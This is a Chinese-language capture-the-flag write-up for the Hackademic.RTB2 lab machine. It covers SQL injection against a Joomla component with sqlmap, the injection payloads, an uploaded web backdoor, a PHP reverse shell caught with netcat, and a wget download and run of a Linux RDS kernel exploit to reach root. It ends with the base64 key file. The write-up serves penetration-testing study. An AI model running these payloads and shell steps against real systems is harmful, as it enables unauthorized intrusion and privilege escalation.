| /administrator/ /cache/ /components/ /images/ 
| /includes/ /installation/ /language/ /libraries/ /media/ 
|_/modules/ /plugins/ /templates/ /tmp/ /xmlrpc/
|_http-server-header: Apache/2.2.14 (Ubuntu)
|_http-title: Hackademic.RTB2
```

一定是以前报告为已过滤的端口。 版本扫描显示这实际上是另一台Web服务器！nmap牛逼！！！firefox访问666端口

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub45.jpg)

可以看到是joomla 1.5 templates版本的。

#### 使用自己的方法getshell

点击下图所示的位置，burp抓包保存为sqlmap.txt，然后sqlmap -r跑此包,发现是dba权限的注入能--os-shell，多年前的老靶机果真是够垃圾，我主要是用来学习各种漏洞知识点，以便于实战碰到的话，能够迅速联想到是什么漏洞并且成功利用。

``` bash
root@kali:~# sqlmap -r sqlmap.txt --is-dba
        ___
       __H__                                                                                           
 ___ ___[']_____ ___ ___  {1.3.12#stable}                                                              
|_ -| . [)]     | .'| . |                                                                              
|___|_  ["]_|_|_|__,|  _|                                                                              
      |_|V...       |_|   http://sqlmap.org                                                            

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:21:49 /2019-12-12/

[03:21:49] [INFO] parsing HTTP request from 'sqlmap.txt'
[03:21:49] [INFO] resuming back-end DBMS 'mysql' 
[03:21:49] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: letter (GET)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: option=com_abc&view=abc&letter=List of content items...' AND (SELECT 4640 FROM(SELECT COUNT(*),CONCAT(0x7170786b71,(SELECT (ELT(4640=4640,1))),0x716b787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uVyL&Itemid=3

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: option=com_abc&view=abc&letter=List of content items...' AND (SELECT 1182 FROM (SELECT(SLEEP(5)))sLUv)-- PIge&Itemid=3

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: option=com_abc&view=abc&letter=List of content items...' UNION ALL SELECT NULL,CONCAT(0x7170786b71,0x5248524f517a4a6d7669416152587a486a48704b4a45444c534d74786659424f614f7147534d7965,0x716b787871)#&Itemid=3
---
[03:21:49] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
[03:21:49] [INFO] testing if current user is DBA
[03:21:49] [INFO] fetching current user
current user is DBA: True
[03:21:49] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.84.142'

[*] ending @ 03:21:49 /2019-12-12/


root@kali:~# sqlmap -r sqlmap.txt --os-shell
        ___
       __H__                                                                                           
 ___ ___[(]_____ ___ ___  {1.3.12#stable}                                                              
|_ -| . ["]     | .'| . |                                                                              
|___|_  [(]_|_|_|__,|  _|                                                                              
      |_|V...       |_|   http://sqlmap.org                                                            

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:45:59 /2019-12-12/

[03:45:59] [INFO] parsing HTTP request from 'sqlmap.txt'
[03:45:59] [INFO] resuming back-end DBMS 'mysql' 
[03:45:59] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: letter (GET)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: option=com_abc&view=abc&letter=List of content items...' AND (SELECT 4640 FROM(SELECT COUNT(*),CONCAT(0x7170786b71,(SELECT (ELT(4640=4640,1))),0x716b787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uVyL&Itemid=3

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: option=com_abc&view=abc&letter=List of content items...' AND (SELECT 1182 FROM (SELECT(SLEEP(5)))sLUv)-- PIge&Itemid=3

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: option=com_abc&view=abc&letter=List of content items...' UNION ALL SELECT NULL,CONCAT(0x7170786b71,0x5248524f517a4a6d7669416152587a486a48704b4a45444c534d74786659424f614f7147534d7965,0x716b787871)#&Itemid=3
---
[03:46:00] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
[03:46:00] [INFO] going to use a web backdoor for command prompt
[03:46:00] [INFO] fingerprinting the back-end DBMS operating system
[03:46:00] [INFO] the back-end DBMS operating system is Linux
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
[03:46:02] [WARNING] unable to automatically retrieve the web server document root
what do you want to use for writable directory?
[1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs') (default)
[2] custom location(s)
[3] custom directory list file
[4] brute force search
[03:46:05] [INFO] retrieved web server absolute paths: '/index~.php'
[03:46:05] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method
[03:46:05] [WARNING] reflective value(s) found and filtering out
[03:46:05] [WARNING] unable to upload the file stager on '/var/www/'
[03:46:05] [INFO] trying to upload the file stager on '/var/www/' via UNION method
[03:46:05] [WARNING] expect junk characters inside the file as a leftover from UNION query
[03:46:05] [INFO] the remote file '/var/www/tmpussxf.php' is larger (701 B) than the local file '/tmp/sqlmap2xlaxhqs4350/tmpgmt8uc8y' (700B)                                                                  
[03:46:05] [INFO] the file stager has been successfully uploaded on '/var/www/' - http://192.168.84.142:666/tmpussxf.php
[03:46:05] [INFO] the backdoor has been successfully uploaded on '/var/www/' - http://192.168.84.142:666/tmpbmblb.php
[03:46:05] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> ls
do you want to retrieve the command standard output? [Y/n/a] command standard output:
---
CHANGELOG.php
COPYRIGHT.php
CREDITS.php
INSTALL.php
LICENSE.php
LICENSES.php
Untitledt.png
_installation
administrator
cache
components
configuration.php
configuration.php-dist
htaccess.txt
images
includes
index.php
index2.php
language
libraries
logs
media
modules
pC4Hp8kt@Px8PgkV$!
plugins
robots.txt
templates
tmp
tmpbmblb.php
tmpugano.php
tmpupcaf.php
tmpussxf.php
tmpuxtor.php
welcome
xmlrpc
xxx.html
---
os-shell> 
```

下面使用--os-shell执行成功后sqlmap生成的上传payload上传kali中的php反弹木马来反弹shell,php反弹木马中修改端口和ip的操作不用我多说

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub46.jpg)

ls查看成功上传的木马，并且浏览器访问，kali端 nc -lvp 5566 监听返回了shell

``` bash
os-shell> ls
do you want to retrieve the command standard output? [Y/n/a] command standard output:
---
15285
15285.c
CHANGELOG.php
COPYRIGHT.php
CREDITS.php
INSTALL.php
LICENSE.php
LICENSES.php
Untitledt.png
_installation
administrator
bullfuck.php
cache
components
configuration.php
configuration.php-dist
htaccess.txt
images
includes
index.php
index2.php
language
libraries
logs
media
modules
pC4Hp8kt@Px8PgkV$!
php-reverse-shell.php
plugins
robots.txt
templates
tmp
tmpbmblb.php
tmpugano.php
tmpupcaf.php
tmpussxf.php
tmpuxtor.php
welcome
xmlrpc
xxx.html
---
os-shell> 
```

``` bash
root@kali:~# nc -lvp 5566
listening on [any] 5566 ...
192.168.84.142: inverse host lookup failed: Unknown host
connect to [192.168.84.135] from (UNKNOWN) [192.168.84.142] 42982
Linux HackademicRTB2 2.6.32-24-generic #39-Ubuntu SMP Wed Jul 28 06:07:29 UTC 2010 i686 GNU/Linux
 11:18:34 up  7:36,  0 users,  load average: 0.15, 0.11, 0.30
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: can't access tty; job control turned off
$ id 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
$ python -c 'import pty; pty.spawn("/bin/sh")'
$ pwd
pwd
/var/www
```

#### 提权

Hackademic-RTB2靶机所用的提权exp和Hackademic-RTB1靶机所用的一模一样，[下载地址：](http://www.exploit-db.com/exploits/15285/)

然后在kali中存在exp的目录下运行python一行代码在局域网中分享下载文件。

``` bash
root@kali:~# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
```
然后在shell中执行命令下载该exp

``` bash
$ wget http://192.168.84.135:8000/15285.c
wget http://192.168.84.135:8000/15285.c
--2019-12-13 05:38:57--  http://192.168.84.135:8000/15285.c
Connecting to 192.168.84.135:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7155 (7.0K) [text/plain]
Saving to: `15285.c'

100%[======================================>] 7,155       --.-K/s   in 0s      

2019-12-13 05:38:57 (893 MB/s) - `15285.c' saved [7155/7155]
```

编译并运行exp进行提权

``` bash
$ gcc 15285.c -o 15285
gcc 15285.c -o 15285
$ ./15285
./15285
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved security_ops to 0xc08cac4c
 [+] Resolved default_security_ops to 0xc0773340
 [+] Resolved cap_ptrace_traceme to 0xc02f5060
 [+] Resolved commit_creds to 0xc016dd80
 [+] Resolved prepare_kernel_cred to 0xc016e0c0
[*] Overwriting security ops...
[*] Overwriting function pointer...
[*] Triggering payload...
[*] Restoring function pointer...
[*] Got root!
# whoami 
whoami
root
# id
id
uid=0(root) gid=0(root)
```

That's so great!!!Excellent!!!然后到root文件夹下找到key.txt

``` bash
# cd /root
cd /root
# ls
ls
Desktop  Key.txt
# cat Key.txt
cat Key.txt
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
